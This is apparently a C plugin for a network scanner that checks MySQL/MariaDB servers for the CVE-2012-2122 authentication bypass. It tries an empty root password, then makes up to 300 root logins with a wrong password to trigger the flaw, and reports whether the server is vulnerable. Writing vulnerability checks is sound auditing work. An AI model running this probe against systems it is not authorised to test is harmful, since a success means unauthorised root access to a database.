/* mysql-vuln-cve2012-2122 - MySQL/MariaDB authentication bypass probe. */
#include "arsenal_mysql.h"

int almap_script_run(AlScriptContext *ctx) {
    char version[256];
    unsigned char salt[32];
    char msg[512];
    int fd;
    int i;
    int rc;

    if (!ar_valid(ctx)) {
        return 1;
    }
    fd = ar_mysql_open(ctx, version, sizeof(version), salt, sizeof(salt));
    if (fd < 0) {
        ar_out(ctx, "MySQL CVE-2012-2122: no MySQL handshake");
        return 0;
    }
    rc = ar_mysql_login(fd, "root", "", 1, ctx->timeout_ms, msg, sizeof(msg));
    close(fd);
    if (rc == 0) {
        ar_out(ctx, "MySQL CVE-2012-2122: root accepts an empty password "
               "(not the memcmp bypass)");
        return 0;
    }
    for (i = 0; i < 300; i++) {
        fd = ar_mysql_open(ctx, version, sizeof(version), salt, sizeof(salt));
        if (fd < 0) {
            break;
        }
        rc = ar_mysql_login(fd, "root", "x", 0, 50, msg, sizeof(msg));
        close(fd);
        if (rc == 0) {
            ar_out(ctx, "VULNERABLE: MySQL CVE-2012-2122 auth bypass "
                   "after %d attempts (%s)", i + 1, version);
            return 0;
        }
    }
    ar_out(ctx, "not vulnerable: MySQL CVE-2012-2122 not triggered");
    return 0;
}
